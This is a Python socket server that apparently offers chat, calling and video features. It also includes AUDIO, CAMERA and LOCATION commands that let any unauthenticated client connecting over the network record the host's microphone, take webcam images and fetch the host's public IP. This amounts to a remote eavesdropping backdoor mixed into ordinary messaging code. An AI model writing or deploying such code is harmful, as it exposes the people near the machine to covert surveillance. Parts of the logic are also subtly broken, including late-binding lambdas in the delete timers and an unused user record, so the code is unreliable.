import socket
import threading
import os
import subprocess
import time
from collections import deque

# Server configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5000
BUFFER_SIZE = 4096

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)

print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")

# Client handling thread
def handle_client(client_socket, client_address):
    print(f"[*] New connection from {client_address[0]}:{client_address[1]}")

    # Dictionary to store the user data
    user_data = {}

    while True:
        try:
            # Receive data from the client
            data = client_socket.recv(BUFFER_SIZE).decode()
            if not data:
                break

            # Handle client commands
            if data.startswith('REGISTER:'):
                # Parse the user data
                _, username, photo_data = data.split(':', 2)
                user_data = {'username': username, 'photo': photo_data}
                print(f"[*] User {username} registered.")
                client_socket.send("REGISTERED".encode())

            elif data.startswith('MSG:'):
                message = data[4:].strip()
                print(f"[*] Received message from {client_address[0]}: {message}")
                # Broadcast the message to all connected clients
                for client in clients:
                    if client != client_socket:
                        client.send(f"MSG:{message}".encode())
                        # Delete the message after 5 seconds
                        threading.Timer(5, lambda: client.send(f"DELETE:{message}".encode())).start()

                # Delete the message after 1 minute from the sender
                threading.Timer(60, lambda: client_socket.send(f"DELETE:{message}".encode())).start()

            elif data.startswith('CALL:'):
                call_target = data[5:].strip()
                print(f"[*] Call request from {client_address[0]} to {call_target}")
                # Find the target client and initiate the call
                for client in clients:
                    if client != client_socket:
                        if client.getpeername()[0] == call_target:
                            client.send(f"CALL:{client_address[0]}".encode())
                            break

            elif data.startswith('VIDEO:'):
                video_target = data[6:].strip()
                print(f"[*] Video call request from {client_address[0]} to {video_target}")
                # Find the target client and initiate the video call
                for client in clients:
                    if client != client_socket:
                        if client.getpeername()[0] == video_target:
                            client.send(f"VIDEO:{client_address[0]}".encode())
                            break

            elif data.startswith('LOCATION:'):
                location = subprocess.check_output(['curl', 'ipinfo.io/ip']).decode().strip()
                client_socket.send(f"LOCATION:{location}".encode())

            elif data.startswith('AUDIO:'):
                # Record audio using arecord command and send it to the client
                audio_data = subprocess.check_output(['arecord', '-f', 'S16_LE', '-r', '44100', '-d', '5', '-t', 'wav'])
                client_socket.send(f"AUDIO:{len(audio_data)}".encode())
                client_socket.sendall(audio_data)

            elif data.startswith('CAMERA:'):
                # Open the camera using a program like fswebcam and send the captured image to the client
                image_data = subprocess.check_output(['fswebcam', '-r', '1280x720', '--no-banner', '-'])
                client_socket.send(f"CAMERA:{len(image_data)}".encode())
                client_socket.sendall(image_data)

            elif data.startswith('DELETE:'):
                # Delete the message after 1 minute
                threading.Timer(60, lambda: client_socket.send(f"DELETE:{data[7:]}".encode())).start()

        except ConnectionResetError:
            break

    print(f"[*] {client_address[0]} disconnected")
    clients.remove(client_socket)
    client_socket.close()

# Main server loop
clients = []
while True:
    client_socket, client_address = server_socket.accept()
    clients.append(client_socket)
    client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
    client_thread.start()